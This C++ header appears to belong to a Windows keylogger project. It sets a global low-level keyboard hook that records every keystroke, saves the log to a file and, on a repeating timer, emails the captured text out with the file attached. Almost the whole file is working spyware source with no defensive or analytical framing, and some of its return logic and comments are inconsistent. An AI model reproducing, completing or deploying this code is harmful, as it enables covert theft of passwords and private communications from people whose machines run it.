#ifndef POCKET_KEYBOARDHOOK_H
#define POCKET_KEYBOARDHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "Constants.h"
#include "Timer.h"
#include "SendMail.h"

using namespace std;

string keylog = "";

void timerSendMail(){
    if (keylog.empty()) return;

    string lastFile = IO::writeLog(keylog);

    if (lastFile.empty()) {
        Helper::writeLog("File creation didn't work. Keylog = '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + lastFile + "]", "Logs attached:\n" + keylog, IO::getPath(true) + lastFile);
    if (x != 7) Helper::writeLog("Mail failed. Error " + Helper::toString(x));
    else keylog = "";
}

Timer MailTimer(timerSendMail, 100 * 60, Timer::inf);  // 1000 = repeat every 1 min
HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
    if(nCode < 0) CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){ // WM_IME_KEYDOWN
        keylog += Keys::KEYS[kbs->vkCode].Name; // use the system name from keyboard and use our map to convert it to a human friendly name
        if (kbs->vkCode == VK_RETURN) keylog += '\n';  // new line if enter was pressed, add new line
    } else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {  // WM_IME_KEYUP
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name; // translate key to human friendly name
            KeyName.insert(1, "/"); // insert like backslash to show key being released
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook(){
    Helper::writeLog("Program started.");
    MailTimer.Start(true);

    // WH_KEYBOARD_LL:      says we use keyboard hook. LL means low level & global hook
    // OurKeyBoardProc:     procedure invoked by hook system every time user press a key
    // GetModuleHandle:     serves for obtaining H instance
    // DWTHREADID (0):      identifier of thread which hook procedure is associated with (all existing threads)

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(nullptr), 0);
    return eHook == nullptr;
}

bool UninstallHook(){ // disable hook, doesn't kill process
    bool b = UnhookWindowsHookEx(eHook);
    eHook = nullptr;
    return (bool)b;
}

bool IsHooked() {
    return (bool)(eHook == nullptr);
}


#endif //POCKET_KEYBOARDHOOK_H
